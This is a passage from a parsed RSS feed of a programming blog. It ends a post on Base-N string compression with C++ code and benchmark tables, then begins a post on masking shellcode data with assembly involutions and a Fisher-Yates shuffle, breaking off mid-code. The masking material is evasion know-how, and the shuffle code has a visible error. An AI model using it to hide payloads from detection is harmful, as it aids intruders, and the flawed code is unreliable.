#808030;\">,</span> tmp<span style=\"color: #808030;\">,</span> pwr<span style=\"color: #808030;\">,</span> ctx<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>  <span style=\"color: #696969;\">// tmp = pwr * idx</span>\n        BN_add<span style=\"color: #808030;\">(</span>val<span style=\"color: #808030;\">,</span> val<span style=\"color: #808030;\">,</span> tmp<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>       <span style=\"color: #696969;\">// val += tmp</span>\n        BN_mul<span style=\"color: #808030;\">(</span>pwr<span style=\"color: #808030;\">,</span> pwr<span style=\"color: #808030;\">,</span> base<span style=\"color: #808030;\">,</span> ctx<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span> <span style=\"color: #696969;\">// pwr *= base</span>\n    <span style=\"color: #800080;\">}</span>\n    \n    BN_free<span style=\"color: #808030;\">(</span>pwr<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    BN_free<span style=\"color: #808030;\">(</span>tmp<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    BN_free<span style=\"color: #808030;\">(</span>base<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    BN_CTX_free<span style=\"color: #808030;\">(</span>ctx<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n<span style=\"color: #800080;\">}</span>\n\n<span style=\"color: #696969;\">//</span>\n<span style=\"color: #696969;\">// Decompress a string using Base-N encoding.</span>\n<span style=\"color: #696969;\">//</span>\nstd<span style=\"color: #800080;\">::</span>string\nbase_n_decompress<span style=\"color: #808030;\">(</span>BIGNUM <span style=\"color: #808030;\">*</span>val<span style=\"color: #808030;\">,</span> <span style=\"color: #800000; font-weight: bold;\">char</span> <span style=\"color: #808030;\">*</span>alpha<span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n    <span style=\"color: #800000; font-weight: bold;\">const</span> <span style=\"color: #800000; font-weight: bold;\">char</span> <span style=\"color: #808030;\">*</span>base_tbl <span style=\"color: #808030;\">=</span> alpha<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">size_t</span> outlen<span style=\"color: #800080;\">;</span>\n    std<span style=\"color: #800080;\">::</span>string str<span style=\"color: #800080;\">;</span>\n    \n    BIGNUM <span style=\"color: #808030;\">*</span>pwr <span style=\"color: #808030;\">=</span> BN_new<span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    BIGNUM <span style=\"color: #808030;\">*</span>base <span style=\"color: #808030;\">=</span> BN_new<span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    BIGNUM <span style=\"color: #808030;\">*</span>rem <span style=\"color: #808030;\">=</span> BN_new<span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    BN_CTX <span style=\"color: #808030;\">*</span>ctx <span style=\"color: #808030;\">=</span> BN_CTX_new<span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    \n    BN_sub_word<span style=\"color: #808030;\">(</span>val<span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">1</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>                 <span style=\"color: #696969;\">// val--;</span>\n    BN_set_word<span style=\"color: #808030;\">(</span>pwr<span style=\"color: #808030;\">,</span> <span style=\"color: #603000;\">strlen</span><span style=\"color: #808030;\">(</span>base_tbl<span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>  <span style=\"color: #696969;\">// pwr = strlen(base_tbl)</span>\n    BN_set_word<span style=\"color: #808030;\">(</span>base<span style=\"color: #808030;\">,</span> <span style=\"color: #603000;\">strlen</span><span style=\"color: #808030;\">(</span>base_tbl<span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span> <span style=\"color: #696969;\">// base = strlen(base_tbl)</span>\n    \n    <span style=\"color: #696969;\">// obtain the length of string</span>\n    <span style=\"color: #800000; font-weight: bold;\">for</span> <span style=\"color: #808030;\">(</span>outlen<span style=\"color: #808030;\">=</span><span style=\"color: #008c00;\">1</span><span style=\"color: #800080;\">;</span> BN_cmp<span style=\"color: #808030;\">(</span>val<span style=\"color: #808030;\">,</span> pwr<span style=\"color: #808030;\">)</span> <span style=\"color: #808030;\">&gt;</span><span style=\"color: #808030;\">=</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #800080;\">;</span> outlen<span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n        BN_sub<span style=\"color: #808030;\">(</span>val<span style=\"color: #808030;\">,</span> val<span style=\"color: #808030;\">,</span> pwr<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>          <span style=\"color: #696969;\">// val -= pwr; </span>\n        BN_mul<span style=\"color: #808030;\">(</span>pwr<span style=\"color: #808030;\">,</span> pwr<span style=\"color: #808030;\">,</span> base<span style=\"color: #808030;\">,</span> ctx<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>    <span style=\"color: #696969;\">// pwr *= base</span>\n    <span style=\"color: #800080;\">}</span>\n    \n    <span style=\"color: #696969;\">// write string to buffer</span>\n    <span style=\"color: #800000; font-weight: bold;\">for</span> <span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">size_t</span> i<span style=\"color: #808030;\">=</span><span style=\"color: #008c00;\">0</span><span style=\"color: #800080;\">;</span> i<span style=\"color: #808030;\">&lt;</span>outlen<span style=\"color: #800080;\">;</span> i<span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n        BN_div<span style=\"color: #808030;\">(</span>val<span style=\"color: #808030;\">,</span> rem<span style=\"color: #808030;\">,</span> val<span style=\"color: #808030;\">,</span> base<span style=\"color: #808030;\">,</span> ctx<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span> <span style=\"color: #696969;\">// val % tbl_len</span>\n        <span style=\"color: #800000; font-weight: bold;\">unsigned</span> <span style=\"color: #800000; font-weight: bold;\">long</span> r <span style=\"color: #808030;\">=</span> BN_get_word<span style=\"color: #808030;\">(</span>rem<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n        str<span style=\"color: #808030;\">.</span>push_back<span style=\"color: #808030;\">(</span>base_tbl<span style=\"color: #808030;\">[</span>r<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    <span style=\"color: #800080;\">}</span>\n    \n    BN_free<span style=\"color: #808030;\">(</span>pwr<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    BN_free<span style=\"color: #808030;\">(</span>rem<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    BN_free<span style=\"color: #808030;\">(</span>base<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    BN_CTX_free<span style=\"color: #808030;\">(</span>ctx<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #800000; font-weight: bold;\">return</span> str<span style=\"color: #800080;\">;</span>\n<span style=\"color: #800080;\">}</span>\n</pre>\n<!--Created using ToHtml.com on 2022-08-21 23:04:53 UTC -->\n\n<h2>Frequency Analysis</h2>\n\n<p>Base-N decoding doesn&#8217;t choose the length of bit strings optimally. It doesn&#8217;t assign the shortest amount of bits to bytes that occur more frequently in the string like Huffman encoding. If we only use a base number equal to the length of unique characters in the string, we can compress it much better. The following code can generate an optimal alphabet based on the string to compress.</p>\n\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #696969;\">//</span>\n<span style=\"color: #696969;\">// Generate an alphabet for optimal compression.</span>\n<span style=\"color: #696969;\">//</span>\n<span style=\"color: #800000; font-weight: bold;\">void</span>\ngenerate_alphabet<span style=\"color: #808030;\">(</span><span style=\"color: #800000; font-weight: bold;\">char</span> <span style=\"color: #808030;\">*</span>alpha<span style=\"color: #808030;\">,</span> <span style=\"color: #666616;\">std</span><span style=\"color: #800080;\">::</span><span style=\"color: #603000;\">string</span> str<span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n    <span style=\"color: #666616;\">std</span><span style=\"color: #800080;\">::</span><span style=\"color: #603000;\">unordered_map</span><span style=\"color: #800080;\">&lt;</span><span style=\"color: #800000; font-weight: bold;\">char</span><span style=\"color: #808030;\">,</span> <span style=\"color: #800000; font-weight: bold;\">int</span><span style=\"color: #800080;\">&gt;</span> freq<span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #696969;\">// count frequency of each character in string we want to compress.</span>\n    <span style=\"color: #800000; font-weight: bold;\">for</span> <span style=\"color: #808030;\">(</span><span style=\"color: #800000; font-weight: bold;\">const</span> <span style=\"color: #800000; font-weight: bold;\">char</span> <span style=\"color: #808030;\">&amp;</span>c<span style=\"color: #800080;\">:</span> str<span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n        freq<span style=\"color: #808030;\">[</span>c<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">+</span><span style=\"color: #800080;\">;</span>\n    <span style=\"color: #800080;\">}</span>\n    \n    <span style=\"color: #696969;\">// convert map to a vector and sort in ascending order.</span>\n    <span style=\"color: #666616;\">std</span><span style=\"color: #800080;\">::</span><span style=\"color: #603000;\">vector</span><span style=\"color: #808030;\">&lt;</span><span style=\"color: #666616;\">std</span><span style=\"color: #800080;\">::</span><span style=\"color: #603000;\">pair</span><span style=\"color: #808030;\">&lt;</span><span style=\"color: #800000; font-weight: bold;\">char</span><span style=\"color: #808030;\">,</span> <span style=\"color: #800000; font-weight: bold;\">int</span><span style=\"color: #808030;\">&gt;</span><span style=\"color: #808030;\">&gt;</span> elems<span style=\"color: #808030;\">(</span>freq<span style=\"color: #808030;\">.</span>begin<span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">,</span> freq<span style=\"color: #808030;\">.</span>end<span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    <span style=\"color: #666616;\">std</span><span style=\"color: #800080;\">::</span><span style=\"color: #603000;\">sort</span><span style=\"color: #808030;\">(</span>elems<span style=\"color: #808030;\">.</span>begin<span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">,</span> elems<span style=\"color: #808030;\">.</span>end<span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">[</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">(</span><span style=\"color: #800000; font-weight: bold;\">auto</span> <span style=\"color: #808030;\">&amp;</span>left<span style=\"color: #808030;\">,</span> <span style=\"color: #800000; font-weight: bold;\">auto</span> <span style=\"color: #808030;\">&amp;</span>right<span style=\"color: #808030;\">)</span> <span style=\"color: #ffffff; background: #dd0000; font-weight: bold; font-style: italic;\">{</span>\n        <span style=\"color: #800000; font-weight: bold;\">return</span> left<span style=\"color: #808030;\">.</span>second <span style=\"color: #808030;\">&gt;</span> right<span style=\"color: #808030;\">.</span>second<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #ffffff; background: #dd0000; font-weight: bold; font-style: italic;\">}</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n\n    <span style=\"color: #696969;\">// save each character to output buffer.</span>\n    <span style=\"color: #800000; font-weight: bold;\">for</span> <span style=\"color: #808030;\">(</span><span style=\"color: #800000; font-weight: bold;\">auto</span> <span style=\"color: #808030;\">&amp;</span><span style=\"color: #603000;\">pair</span> <span style=\"color: #800080;\">:</span> elems<span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n        <span style=\"color: #808030;\">*</span>alpha<span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">+</span> <span style=\"color: #808030;\">=</span> <span style=\"color: #603000;\">pair</span><span style=\"color: #808030;\">.</span>first<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #800080;\">}</span>\n<span style=\"color: #800080;\">}</span>\n</pre>\n\n<p>We perform the same tests as before and see a distinct improvement. However, the higher compression ratio is more likely the result of a smaller lookup table/base number rather than sorting the most frequent characters in ascending order.</p>\n\n<table class=\"tg\">\n<thead>\n  <tr>\n    <th>Base</th>\n    <th class=\"tg-0lax\">Input</th>\n    <th class=\"tg-0lax\">Alphabet</th>\n    <th>% Decrease</th>\n  </tr>\n</thead>\n<tbody>\n  <tr>\n    <td>1</td>\n    <td class=\"tg-0lax\">64 x &#8220;0&#8221;</td>\n    <td class=\"tg-0lax\">0</td>\n    <td>99</td>\n  </tr>\n  <tr>\n    <td>9</td>\n    <td class=\"tg-0lax\">18446744073709551615</td>\n    <td class=\"tg-0lax\">457106938</td>\n    <td>60</td>\n  </tr>\n  <tr>\n    <td>1</td>\n    <td class=\"tg-0lax\">FFFFFFFFFFFFFFFF</td>\n    <td class=\"tg-0lax\">F</td>\n    <td>94<br /></td>\n  </tr>\n  <tr>\n    <td>26</td>\n    <td class=\"tg-0lax\">THEQUICKBROWNFOXJUMPSOVERTHELAZYDOG</td>\n    <td class=\"tg-0lax\">OERUHTNGWBKCIQFXJMPSVLAZYD<br /></td>\n    <td>40</td>\n  </tr>\n  <tr>\n    <td>27<br /></td>\n    <td class=\"tg-0lax\">THEQUICKBROWNFOXJUMPSOVERTHELAZYDOG2</td>\n    <td class=\"tg-0lax\">OERUTHNGW2BKCIQFXJMPSVLAZYD</td>\n    <td>39</td>\n  </tr>\n  <tr>\n    <td>26</td>\n    <td class=\"tg-0lax\">Thequickbrownfoxjumpsoverthelazydog</td>\n    <td class=\"tg-0lax\">oeruhfwbkciqTngxjmpsvtlazyd</td>\n    <td>40</td>\n  </tr>\n  <tr>\n    <td>28</td>\n    <td class=\"tg-0lax\">Thequickbrownfoxjumpsoverthelazydog2</td>\n    <td class=\"tg-0lax\">oeruhfwbkciqTngxjmpsvtl2azyd</td>\n    <td>39</td>\n  </tr>\n</tbody>\n</table>\n\n<h2>Compared to Other Libraries</h2>\n\n<p>The following examples are from the UniShox2 repository. Green columns highlight the best ratio, but these are only preliminary tests. The Base-N decoding uses frequency analysis before compression. I would not want to claim that Base-N compression outperforms UniShox2!</p>\n\n<table class=\"tg\">\n<thead>\n  <tr>\n    <th class=\"tg-0lax\">String</th>\n    <th class=\"tg-0lax\">Size</th>\n    <th class=\"tg-0lax\">UniShox2</th>\n    <th class=\"tg-0pky\">Base-N <br />Decoding</th>\n    <th class=\"tg-0pky\">Shoco</th>\n  </tr>\n</thead>\n<tbody>\n  <tr>\n    <td class=\"tg-0lax\">Beauty is not in the face. Beauty is a light in the heart.</td>\n    <td class=\"tg-0lax\">58</td>\n    <td class=\"tg-kd4e\">30</td>\n    <td class=\"tg-0pky\">31<br /></td>\n    <td class=\"tg-0pky\">46</td>\n  </tr>\n  <tr>\n    <td class=\"tg-0lax\">The quick brown fox jumps over the lazy dog.</td>\n    <td class=\"tg-0lax\">44</td>\n    <td class=\"tg-0lax\">31</td>\n    <td class=\"tg-xwmr\">27</td>\n    <td class=\"tg-0pky\">38</td>\n  </tr>\n  <tr>\n    <td class=\"tg-0lax\">WRITING ENTIRELY IN BLOCK CAPITALS IS SHOUTING, and it&#8217;s rude</td>\n    <td class=\"tg-0lax\">61</td>\n    <td class=\"tg-0lax\">47</td>\n    <td class=\"tg-xwmr\">38</td>\n    <td class=\"tg-0pky\">58</td>\n  </tr>\n  <tr>\n    <td class=\"tg-0lax\">Rose is a rose is a rose is a rose.</td>\n    <td class=\"tg-0lax\">35</td>\n    <td class=\"tg-riiz\">12</td>\n    <td class=\"tg-0pky\">14</td>\n    <td class=\"tg-0pky\">25</td>\n  </tr>\n  <tr>\n    <td class=\"tg-0lax\">039f7094-83e4-4d7f-aa38-8844c67bd82d</td>\n    <td class=\"tg-0lax\">36</td>\n    <td class=\"tg-kd4e\">18</td>\n    <td class=\"tg-kd4e\">18</td>\n    <td class=\"tg-0lax\">36</td>\n  </tr>\n  <tr>\n    <td class=\"tg-0lax\">2021-07-15T16:37:35.897Z</td>\n    <td class=\"tg-0lax\">24</td>\n    <td class=\"tg-kd4e\">9</td>\n    <td class=\"tg-0lax\">12<br /></td>\n    <td class=\"tg-0lax\">24</td>\n  </tr>\n  <tr>\n    <td class=\"tg-0lax\">(760) 756-7568</td>\n    <td class=\"tg-0lax\">14</td>\n    <td class=\"tg-0lax\">7</td>\n    <td class=\"tg-kd4e\">6</td>\n    <td class=\"tg-0lax\">14</td>\n  </tr>\n  <tr>\n    <td class=\"tg-0lax\">This is a loooooooooooooooooooooong string</td>\n    <td class=\"tg-0lax\">42</td>\n    <td class=\"tg-kd4e\">15</td>\n    <td class=\"tg-0lax\">19</td>\n    <td class=\"tg-0lax\">25</td>\n  </tr>\n</tbody>\n</table>\n\n<h2>Summary</h2>\n\n<p>We see that Base-N decoding, which works similar to Huffman encoding, can be effective for compressing and obfuscating short strings. The results are even better when frequency analysis occurs before compression. Shuffling the bits used in the base table makes it possible to have a type of &#8220;polymorphic text-to-binary&#8221; algorithm. There are limitations, of course, like the need for multi-precision arithmetic when the conversion of string to binary exceeds <img alt=\"2^{32}\" class=\"latex\" src=\"https://s0.wp.com/latex.php?latex=2%5E%7B32%7D&#038;bg=ffffff&#038;fg=333333&#038;s=0&#038;c=20201002\" /> or <img alt=\"2^{64}\" class=\"latex\" src=\"https://s0.wp.com/latex.php?latex=2%5E%7B64%7D&#038;bg=ffffff&#038;fg=333333&#038;s=0&#038;c=20201002\" /> bit integers. However, perhaps someone will devise a more optimal algorithm that avoids the need for such.</p>"
                }
            ],
            "wfw_commentrss": "https://modexp.wordpress.com/2022/08/22/base_n_compression/feed/",
            "slash_comments": "0",
            "media_content": [
                {
                    "url": "https://0.gravatar.com/avatar/6505a0ec0ae84dac45856b91b0cc2343?s=96&d=identicon&r=G",
                    "medium": "image"
                }
            ]
        },
        {
            "title": "Shellcode: Data Masking",
            "title_detail": {
                "type": "text/plain",
                "language": null,
                "base": "https://modexp.wordpress.com/feed/",
                "value": "Shellcode: Data Masking"
            },
            "links": [
                {
                    "rel": "alternate",
                    "type": "text/html",
                    "href": "https://modexp.wordpress.com/2022/07/31/shellcode-data-masking/"
                }
            ],
            "link": "https://modexp.wordpress.com/2022/07/31/shellcode-data-masking/",
            "comments": "https://modexp.wordpress.com/2022/07/31/shellcode-data-masking/#respond",
            "authors": [
                {
                    "name": "odzhan"
                }
            ],
            "author": "odzhan",
            "author_detail": {
                "name": "odzhan"
            },
            "published": "Sun, 31 Jul 2022 00:01:53 +0000",
            "published_parsed": [
                2022,
                7,
                31,
                0,
                1,
                53,
                6,
                212,
                0
            ],
            "tags": [
                {
                    "term": "assembly",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "compression",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "cryptography",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "encryption",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "programming",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "security",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "shellcode",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "fisher-yates",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "shuffling",
                    "scheme": null,
                    "label": null
                }
            ],
            "id": "http://modexp.wordpress.com/?p=5182",
            "guidislink": false,
            "summary": "Introduction There are more than four ways to mask data, but these are the main ones to focus on in this post. Lossless Compression Encryption Steganography Shuffling If we want to detect a compressed or encrypted stream of bytes but &#8230; <a href=\"https://modexp.wordpress.com/2022/07/31/shellcode-data-masking/\">Continue reading <span class=\"meta-nav\">&#8594;</span></a>",
            "summary_detail": {
                "type": "text/html",
                "language": null,
                "base": "https://modexp.wordpress.com/feed/",
                "value": "Introduction There are more than four ways to mask data, but these are the main ones to focus on in this post. Lossless Compression Encryption Steganography Shuffling If we want to detect a compressed or encrypted stream of bytes but &#8230; <a href=\"https://modexp.wordpress.com/2022/07/31/shellcode-data-masking/\">Continue reading <span class=\"meta-nav\">&#8594;</span></a>"
            },
            "content": [
                {
                    "type": "text/html",
                    "language": null,
                    "base": "https://modexp.wordpress.com/feed/",
                    "value": "<h2>Introduction</h2>\n\n<p>There are more than four ways to mask data, but these are the main ones to focus on in this post.</p> \n\n<ol>\n    <li>Lossless Compression</li>\n    <li>Encryption</li> \n    <li>Steganography</li>\n    <li>Shuffling</li>\n</ol>\n\n<p>If we want to detect a compressed or encrypted stream of bytes but can&#8217;t rely on a file header for a signature, the best way is by using something like a <a href=\"https://en.wikipedia.org/wiki/Chi-squared_test\">Chi-Square test</a>. The more uniform the data is, the more likely it is to be compressed or encrypted.</p>\n\n<p>Steganography is better at masking. Some image formats already use lossless compression to reduce the size of files. The PNG format, for example, uses Zlib, and the high compression ratio will result in the file having a high amount of entropy. The GIF format also uses LZW as its compression method but is limited to 256 colours, which results in losing information during the encoding process. Of course, you have the option of parsing GIFs manually, but PNG is probably easier to work with in most image encoding libraries.</p>\n\n<h2 id=\"inv\">Involutions</h2>\n\n<p>In mathematics, an involution, or an involutory function, is a function that is its own inverse; For the following instructions, I&#8217;m merely using this word to describe what they do in practice. Executed once will mask data, and executing again will unmask. These are very common but also very weak when used alone.</p>\n\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #008c00;\">1</span><span style=\"color: #808030;\">)</span> eXclusive<span style=\"color: #808030;\">-</span><span style=\"color: #800000; font-weight: bold;\">OR</span> bitwise operation\n    <span style=\"color: #800000; font-weight: bold;\">xor</span>   <span style=\"color: #000080;\">eax</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">-1</span>\n\n<span style=\"color: #008c00;\">2</span><span style=\"color: #808030;\">)</span> Bitwise <span style=\"color: #800000; font-weight: bold;\">NOT</span>\n    <span style=\"color: #800000; font-weight: bold;\">not</span>   <span style=\"color: #000080;\">eax</span>\n    <span style=\"color: #800000; font-weight: bold;\">xor</span>   <span style=\"color: #000080;\">eax</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">-1</span>\n\n<span style=\"color: #008c00;\">3</span><span style=\"color: #808030;\">)</span> Bitwise Negation\n    <span style=\"color: #800000; font-weight: bold;\">neg</span>   <span style=\"color: #000080;\">eax</span>\n    <span style=\"color: #800000; font-weight: bold;\">imul</span>  <span style=\"color: #000080;\">eax</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">-1</span>\n    \n<span style=\"color: #008c00;\">4</span><span style=\"color: #808030;\">)</span> Circular Shift\n    <span style=\"color: #800000; font-weight: bold;\">shrd</span>  <span style=\"color: #000080;\">eax</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">eax</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">16</span>\n    <span style=\"color: #800000; font-weight: bold;\">ror</span>   <span style=\"color: #000080;\">eax</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">16</span>\n    <span style=\"color: #800000; font-weight: bold;\">rol</span>   <span style=\"color: #000080;\">eax</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">16</span>\n    <span style=\"color: #800000; font-weight: bold;\">ror</span>   <span style=\"color: #000080;\">al</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">4</span>\n  \n<span style=\"color: #008c00;\">5</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800000; font-weight: bold;\">Byte</span> Swapping\n    <span style=\"color: #800000; font-weight: bold;\">bswap</span> <span style=\"color: #000080;\">eax</span>\n    <span style=\"color: #800000; font-weight: bold;\">xchg</span>  <span style=\"color: #000080;\">al</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">ah</span>\n</pre>\n<!--Created using ToHtml.com on 2022-07-30 21:50:11 UTC -->\n\n<p>The circular shift and byte swapping operations are much closer to a permutation. They could also be used on large arrays in addition to the shuffling.</p>\n\n<h2 id=\"shuf\">Random Shuffling</h2>\n\n<p>Let\u2019s imagine you want to shuffle a deck of cards for an online poker game. The shuffling algorithm must be unbiased, and the results can\u2019t be predictable before a game begins. Many who have asked for such an algorithm know of the <a href=\"https://en.wikipedia.org/wiki/Fisher%E2%80%93Yates_shuffle\">Fisher-Yates</a> shuffle. It&#8217;s an algorithm for generating a random permutation of a finite sequence. It was proposed by Ronald Fisher and Frank Yates in their book <a href=\"https://www.nature.com/articles/144533a0\">Statistical Tables for Biological, Agricultural and Medical Research</a> published in 1939. Richard Durstenfeld modified the algorithm in 1964, and <a href=\"https://www-cs-faculty.stanford.edu/~knuth/\">Donald E. Knuth</a> popularised it in his 1968 book <a href=\"https://en.wikipedia.org/wiki/The_Art_of_Computer_Programming\">The Art of Computer Programming</a>, hence why some refer to it as the Knuth Shuffle.</p>\n\n<p>The following code in C illustrates how one might shuffle a byte array. Here, we&#8217;re using the current time as a seed to initialise the PRNG, which wouldn&#8217;t be recommended for a poker game. <img alt=\"\ud83d\ude00\" class=\"wp-smiley\" src=\"https://s0.wp.com/wp-content/mu-plugins/wpcom-smileys/twemoji/2/72x72/1f600.png\" style=\"height: 1em;\" /></p>\n\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #800000; font-weight: bold;\">void</span>\nfisher_yates_shuffle<span style=\"color: #808030;\">(</span><span style=\"color: #800000; font-weight: bold;\">void</span> <span style=\"color: #808030;\">*</span>inbuf<span style=\"color: #808030;\">,</span> <span style=\"color: #603000;\">size_t</span> inlen<span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n    uint8_t <span style=\"color: #808030;\">*</span>in <span style=\"color: #808030;\">=</span> <span style=\"color: #808030;\">(</span>uint8_t<span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">)</span>inbuf<span style=\"color: #800080;\">;</span>\n    uint8_t t<span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #603000;\">srand</span><span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">time</span><span style=\"color: #808030;\">(</span><span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #800000; font-weight: bold;\">for</span> <span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">size_t</span> i <span style=\"color: #808030;\">=</span> inlen <span style=\"color: #808030;\">-</span> <span style=\"color: #008c00;\">1</span><span style=\"color: #800080;\">;</span> i <span style=\"color: #808030;\">&gt;</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #800080;\">;</span> i<span style=\"color: #808030;\">-</span><span style=\"color: #808030;\">-</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n        uint32_t j <span style=\"color: #808030;\">=</span> <span style=\"color: #603000;\">rand</span><span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">)</span> <span style=\"color: #808030;\">%</span> <span style=\"color: #808030;\">(</span>i <span style=\"color: #808030;\">+</span> <span style=\"color: #008c00;\">1</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n        uint8_t <span style=\"color: #808030;\">=</span> in<span style=\"color: #808030;\">[</span>i<span style=\"color: #808030;\">]</span><span style=\"color: #800080;\">;</span>\n        in<span style=\"color: #808030;\">[</span>i<span style=\"color: #808030;\">]</span> <span style=\"color: #808030;\">=</span> in<span style=\"color: #808030;\">[</span>j<span style=\"color: #808030;\">]</span><span style=\"color: #800080;\">;</span>\n        in<span style=\"color: #808030;\">[</span>j<span style=\"color: #808030;\">]</span> <span style=\"color: #808030;\">=</span> t<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #800080;\">}</span>\n<span style=\"color: #800080;\">}</span>\n</pre>\n<!--Created using ToHtml.com on 2022-07-30 21:49:31 UTC -->\n\n<p>Obtaining a unique sequence of numbers to shuffle the array is problematic. Most software will use a pseudorandom number generator (PRNG). However, knowing how to generate the same sequence of numbers used to shuffle a deck of cards allows us to determine where every card is and even reverse the process. But that&#8217;s precisely what makes Fisher-Yates useful for masking. We want to unshuffle our masked data later; it&#8217;s just that rand() isn&#8217;t suitable. We need something else.</p>\n\n<h2>Keyed/Seeded/Deterministic Shuffling</h2>\n\n<p>Apart from rand() being weak for shuffling, unshuffling the array would require starting with the last number returned by it. rand() doesn&#8217;t support this type of random access, therefore our unshuffling algorithm would be required to generate the exact same sequence of numbers and store each one in memory before starting to unshuffle. We need a function that can produce deterministic values based on a seed or key. Seeded or keyed shuffling and unshuffling is really what we need.</p>\n\n<p>A PRNG is also a Deterministic Random Bit Generator (DRBG). The DRBG/PRNG-generated sequence is not truly random because an initial value, called the PRNG&#8217;s seed (which may include truly random values), entirely determines the output bits generated by it. Therefore, we can replace rand() with a stream cipher like RC4, ChaCha, or a block cipher like AES in Counter (CTR) mode and generate deterministic values.</p>\n<p></p>\n\n<p>NIST has defined how to construct a DRBG from CTR mode in <a href=\"https://csrc.nist.gov/publications/detail/sp/800-90a/rev-1/final\">SP 800-90Ar1</a>, but it&#8217;s unnecessary to use this for masking. Rather than implement a DRBG, we just need to encrypt the range index using a secret key and then derive an unbiased number within that range from the ciphertext. The following code tries to demonstrate how it might be done in practice.</p>\n\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #004a43;\">#</span><span style=\"color: #004a43;\">if</span><span style=\"color: #004a43;\"> </span><span style=\"color: #004a43;\">defined</span><span style=\"color: #808030;\">(</span><span style=\"color: #004a43;\">_WIN64</span><span style=\"color: 